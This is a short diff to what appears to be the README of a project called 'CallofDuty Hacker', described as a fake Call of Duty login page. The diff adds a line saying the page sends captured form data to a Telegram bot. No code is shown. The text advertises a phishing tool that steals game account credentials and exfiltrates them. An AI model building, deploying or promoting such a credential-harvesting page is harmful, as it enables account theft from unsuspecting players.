@@ -2,6 +2,7 @@
 # CallofDuty Hacker
 
 Fake login page for CallofDuty
+send form data to telegram bot
 
 
 ## Screenshot
